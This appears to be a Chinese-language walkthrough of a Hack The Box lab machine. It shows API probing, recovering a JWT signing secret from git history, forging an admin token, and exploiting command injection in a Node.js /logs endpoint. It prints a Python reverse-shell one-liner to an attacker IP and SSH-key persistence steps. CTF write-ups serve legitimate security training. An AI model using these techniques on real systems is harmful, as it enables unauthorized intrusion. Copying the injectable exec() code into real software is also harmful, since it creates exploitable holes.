[https://app.hackthebox.com/machines/408](https://app.hackthebox.com/machines/408)

nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232034435.png)

---

在`docs`目录介绍了如何调试api,而`3000`端口是用于api调试的,使用`postman`进行api调试

>注意格式选择`JSON`而不是`TEXT`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232048690.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232050916.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNiMTcwMjljNmRlNzA0NWNmMzQxNmUiLCJuYW1lIjoibWkzYWthIiwiZW1haWwiOiJtaTNha2FAbWkzYWthLmNvbSIsImlhdCI6MTY0ODAzOTgyOX0.J0uPhnjO3JNsdsPOoNd-gKbgU_d-voRaHp6BlR7Nc04
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232116060.png)

1. 尝试将`HS256`修改成`None`,无果

2. 从[http://10.10.11.120/download/files.zip](http://10.10.11.120/download/files.zip)下载源码,尝试从源码中寻找对称加密密钥

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232117299.png)

```js
//routes/auth.js

router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');


    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})
```

```
//.env

DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

但是经过验证这个`TOKEN_SECRET`不正确

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232123994.png)

列了一下目录,发现存在`.git`目录,尝试恢复git记录

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232133748.png)

`git log`查看

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232133265.png)

```
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
```

`git log -p`显示每次提交所引入的差异

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232136222.png)

```
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232136553.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232141634.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNiMTcwMjljNmRlNzA0NWNmMzQxNmUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1pM2FrYUBtaTNha2EuY29tIiwiaWF0IjoxNjQ4MDM5ODI5fQ.iXPlMOgNzfMI5PpQrJsb8pxK93FlHDMIDMw4_aiVlRk
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232141021.png)

---

存在命令注入

```js
//routes/private.js

router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232147194.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232149814.png)

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.20",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232209271.png)

在`.ssh/authorized_keys`加个公钥即可使用ssh链接

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232212331.png)

---

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232215975.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203232220821.png)